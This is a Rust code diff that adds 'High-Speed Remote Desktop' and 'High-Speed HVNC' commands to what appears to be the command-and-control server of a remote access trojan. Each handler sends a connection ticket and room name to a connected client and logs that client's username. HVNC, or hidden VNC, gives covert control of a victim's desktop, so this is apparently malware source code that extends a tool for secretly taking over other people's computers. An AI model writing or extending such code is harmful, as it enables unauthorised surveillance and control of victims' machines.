@@ -317,6 +317,16 @@ impl ServerWrapper {
                         .await
                 }
 
+                StartHighSpeedRemoteDesktop(addr, config) => {
+                    let ticket = crate::utils::iroh_service::get_connection_ticket().await;
+                    let room = format!("rdp_{}", addr.to_string().replace(":", "_"));
+                    self.handle_command(&addr, ClientboundPacket::StartHighSpeedRemoteDesktop {
+                        ticket,
+                        room,
+                        config,
+                    }).await;
+                }
+
                 StopRemoteDesktop(addr) => {
                     self.handle_command(&addr, ClientboundPacket::StopRemoteDesktop)
                         .await;
@@ -452,6 +462,25 @@ impl ServerWrapper {
                             .await;
                         self.send_client_packet(&addr, ClientboundPacket::StartHVNC)
                             .await
+                    }
+                }
+                StartHighSpeedHVNC(addr) => {
+                    if let Some(client) = self.connected_users.get(&addr) {
+                        let ticket = crate::utils::iroh_service::get_connection_ticket().await;
+                        let room = format!("speedyvnc_{}", addr.to_string().replace(":", "_"));
+                        self.log_events
+                            .log(
+                                "cmd_sent",
+                                format!(
+                                    "Starting High-Speed HVNC on client [{}] [{}]",
+                                    addr, client.system.username
+                                ),
+                            )
+                            .await;
+                        self.send_client_packet(&addr, ClientboundPacket::StartHighSpeedHVNC {
+                            ticket,
+                            room,
+                        }).await;
                     }
                 }
                 StopHVNC(addr) => {
